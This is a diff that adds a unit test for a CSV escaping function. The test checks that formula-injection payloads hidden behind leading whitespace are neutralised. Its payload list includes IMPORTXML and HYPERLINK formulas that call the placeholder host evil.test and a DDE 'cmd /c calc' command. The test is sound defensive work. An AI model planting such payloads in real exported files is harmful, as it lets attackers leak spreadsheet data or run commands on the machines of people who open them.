@@ -94,6 +94,30 @@ describe("escapeCsvField — formula injection", () => {
     expect(escaped.endsWith('"')).toBe(true);
   });
 
+  it("neutralises a formula hidden behind LEADING WHITESPACE", () => {
+    // The same reasoning the tab and carriage-return cases rest on, applied
+    // consistently: a spreadsheet strips leading whitespace BEFORE deciding whether
+    // the cell is a formula, so ` =1+1` executes exactly as `=1+1` does. Testing
+    // only `value[0]` against the leader set let a single space defeat the whole
+    // mitigation.
+    const hidden = [
+      " =1+1",
+      '  =HYPERLINK("http://evil.test","klik")',
+      "\n=IMPORTXML(\"http://evil.test/?\",\"//a\")",
+      "\t =1+1",
+      " @SUM(1)",
+      "  -2+3+cmd|' /c calc'!A1",
+      " +1+1",
+    ];
+    for (const value of hidden) {
+      const escaped = escapeCsvField(value);
+      expect(escaped.startsWith('"')).toBe(true);
+      // The apostrophe goes in FRONT of the whitespace, so whatever the reader
+      // strips, the first thing it can reach is text.
+      expect(escaped.slice(0, 2)).toBe("\"'");
+    }
+  });
+
   it("neutralises a formula hidden behind a leading apostrophe-looking character", () => {
     // `'=1+1` already starts with an apostrophe, so it is text in a spreadsheet and
     // needs no second one — but it must still be quoted, and it must not gain a
